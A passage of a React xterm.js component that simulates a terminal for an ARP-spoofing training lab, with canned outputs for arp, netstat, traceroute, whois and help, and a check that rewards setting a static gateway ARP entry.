          await writeCharByChar(term, 'Active UNIX domain sockets (w/o servers)\r\n');
          await writeCharByChar(term, 'Proto RefCnt Flags       Type       State         I-Node   Path\r\n');
          await writeCharByChar(term, 'unix  3      [ ]         STREAM     CONNECTED     48765    /run/systemd/journal/stdout\r\n');
          await writeCharByChar(term, 'unix  3      [ ]         STREAM     CONNECTED     42653    /run/user/1000/bus\r\n');
          break;

        case 'arp':
          if (args[1] === '-a') {
            // Check if ARP has been fixed
            const arpFixed = commandHistory.some(cmd => cmd.includes('sudo arp -s 192.168.1.1'));
            
            if (arpFixed) {
              await writeCharByChar(term, '? (192.168.1.1) at 00:1a:2b:3c:4d:5e [ether] PERM on eth0\r\n');
              await writeCharByChar(term, '[EXPLANATION]\r\n');
              await writeCharByChar(term, '✅ Mitigation Successful!\r\n');
              await writeCharByChar(term, '• Gateway 192.168.1.1 now permanently mapped to\r\n');
              await writeCharByChar(term, '• Correct MAC: 00:1a:2b:3c:4d:5e\r\n');
              await writeCharByChar(term, '[PROMPT]\r\n');
              await writeCharByChar(term, '4. Verify connectivity:\r\n');
              await writeCharByChar(term, 'ping -c 3 192.168.1.1\r\n');
              await writeCharByChar(term, '[RUN COMMAND]\r\n');
            } else {
              await writeCharByChar(term, '? (192.168.1.1) at 00:aa:bb:cc:dd:ee [ether] on eth0\r\n');
              await writeCharByChar(term, '? (192.168.1.100) at 00:1a:2b:3c:4d:5e [ether] on eth0\r\n');
              await writeCharByChar(term, '[EXPLANATION]\r\n');
              await writeCharByChar(term, '🎯 ARP Spoofing Detected!\r\n');
              await writeCharByChar(term, 'Gateway MAC should be 00:1a:2b:3c:4d:5e\r\n');
              await writeCharByChar(term, 'But shows 00:aa:bb:cc:dd:ee instead\r\n\r\n');
              await writeCharByChar(term, '[SYSTEM] Run Part 2 for forensic analysis and mitigation\r\n');
            }
          } else {
            await writeCharByChar(term, 'Usage: arp -a\r\n');
          }
          break;
          
        case 'traceroute':
          if (args.length < 2) {
            await writeCharByChar(term, 'Usage: traceroute <hostname/IP>\r\n');
            break;
          }
          const target = args[1];
          await writeCharByChar(term, `traceroute to ${target} (${target === 'cyberhub.com' ? '172.67.182.31' : '8.8.8.8'}), 30 hops max, 60 byte packets\r\n`);
          await writeCharByChar(term, ' 1  _gateway (192.168.1.1)  2.456 ms  2.532 ms  2.705 ms\r\n');
          await writeCharByChar(term, ' 2  isp-router.net (10.0.0.1)  15.313 ms  15.401 ms  15.593 ms\r\n');
          await writeCharByChar(term, ' 3  regional-node.isp.net (72.14.215.85)  25.376 ms  25.442 ms  25.785 ms\r\n');
          await writeCharByChar(term, ' 4  core-router-1.isp.net (72.14.215.200)  28.648 ms  28.754 ms  28.985 ms\r\n');
          await writeCharByChar(term, ' 5  internet-exchange.net (209.85.251.9)  30.654 ms  30.832 ms  31.078 ms\r\n');
          await writeCharByChar(term, ` 6  ${target === 'cyberhub.com' ? 'edge-router.cyberhub.net (172.67.182.1)' : 'google-edge.net (172.217.0.1)'}  35.443 ms  35.763 ms  35.942 ms\r\n`);
          await writeCharByChar(term, ` 7  ${target === 'cyberhub.com' ? 'cyberhub.com (172.67.182.31)' : 'dns.google (8.8.8.8)'}  36.872 ms  37.045 ms  37.253 ms\r\n`);
          break;

        case 'whois':
          if (args.length < 2) {
            await writeCharByChar(term, 'Usage: whois <domain>\r\n');
            break;
          }
          if (args[1] === 'cyberhub.com') {
            await writeCharByChar(term, 'Domain Name: CYBERHUB.COM\r\n');
            await writeCharByChar(term, 'Registry Domain ID: 1234567890_DOMAIN_COM-VRSN\r\n');
            await writeCharByChar(term, 'Registrar WHOIS Server: whois.registrar.com\r\n');
            await writeCharByChar(term, 'Registrar URL: http://www.registrar.com\r\n');
            await writeCharByChar(term, 'Updated Date: 2022-06-15T09:23:45Z\r\n');
            await writeCharByChar(term, 'Creation Date: 2015-03-27T14:48:36Z\r\n');
            await writeCharByChar(term, 'Registrar Registration Expiration Date: 2025-03-27T14:48:36Z\r\n');
            await writeCharByChar(term, 'Registrar: Example Registrar, Inc.\r\n');
            await writeCharByChar(term, 'Registrar IANA ID: 12345\r\n');
            await writeCharByChar(term, 'Domain Status: clientTransferProhibited https://icann.org/epp#clientTransferProhibited\r\n');
            await writeCharByChar(term, 'Name Server: NS1.CYBERHUB.COM\r\n');
            await writeCharByChar(term, 'Name Server: NS2.CYBERHUB.COM\r\n');
            await writeCharByChar(term, 'DNSSEC: unsigned\r\n');
            await writeCharByChar(term, 'Registrar Abuse Contact Email: abuse@registrar.com\r\n');
            await writeCharByChar(term, 'Registrar Abuse Contact Phone: +1.5555551234\r\n');
          } else {
            await writeCharByChar(term, `No whois information available for ${args[1]}\r\n`);
          }
          break;

        case 'help':
          await writeCharByChar(term, '\x1b[1;33mAvailable Commands:\x1b[0m\r\n');
          await writeCharByChar(term, '  pwd         - Print working directory\r\n');
          await writeCharByChar(term, '  cd <dir>    - Change directory\r\n');
          await writeCharByChar(term, '  ls          - List directory contents\r\n');
          await writeCharByChar(term, '  cat <file>  - View file contents\r\n');
          await writeCharByChar(term, '  python3 <file> - Run Python script\r\n');
          await writeCharByChar(term, '  nslookup <domain> - Query DNS records\r\n');
          await writeCharByChar(term, '  dig <@server> <domain> - DNS lookup tool\r\n');
          await writeCharByChar(term, '  grep <pattern> <file> - Search file for pattern\r\n');
          await writeCharByChar(term, '  ping <host> - Test network connectivity\r\n');
          await writeCharByChar(term, '  ifconfig    - Display network interfaces\r\n');
          await writeCharByChar(term, '  netstat     - Display network connections\r\n');
          await writeCharByChar(term, '  traceroute <host> - Trace route to host\r\n');
          await writeCharByChar(term, '  whois <domain> - Look up domain information\r\n');
          await writeCharByChar(term, '  curl <url>  - Transfer data from URL\r\n');
          await writeCharByChar(term, '  clear       - Clear terminal\r\n');
          await writeCharByChar(term, '  help        - Show this help message\r\n');
          await writeCharByChar(term, '\r\n\x1b[1;33mKeyboard Shortcuts:\x1b[0m\r\n');
          await writeCharByChar(term, '  ↑/↓         - Navigate command history\r\n');
          await writeCharByChar(term, '  Tab         - Auto-complete filenames\r\n');
          await writeCharByChar(term, '  Ctrl+L      - Clear screen\r\n');
          break;

        default:
          if (cmd !== '') {
            await writeCharByChar(term, `\x1b[1;31mCommand not found: ${cmd}\x1b[0m\r\n`);
            await writeCharByChar(term, 'Type "help" for available commands\r\n');
          }
      }

      // Write prompt after command execution
      term.write('\x1b[1;32mroot@spoofing-lab\x1b[0m:\x1b[1;34m' + currentDir.replace('/home/user', '~') + '\x1b[0m$ ');
    };

    // Handle window resize
    const handleResize = () => {
      fitAddon.fit();
    };
    window.addEventListener('resize', handleResize);

    return () => {
      window.removeEventListener('resize', handleResize);
      if (xtermRef.current) {
        xtermRef.current.dispose();
      }
    };
  }, [location]);

  return (
    <div style={{
      width: '100%',
      height: '100%',
      backgroundColor: '#2E3436',
      borderRadius: '5px',
      overflow: 'hidden',
      padding: '10px'
    }}>
      <div 
        ref={terminalRef}
        style={{
          width: '100%',
          height: '100%'
        }}
      />
    </div>
  );
};

export default XtermTerminal;
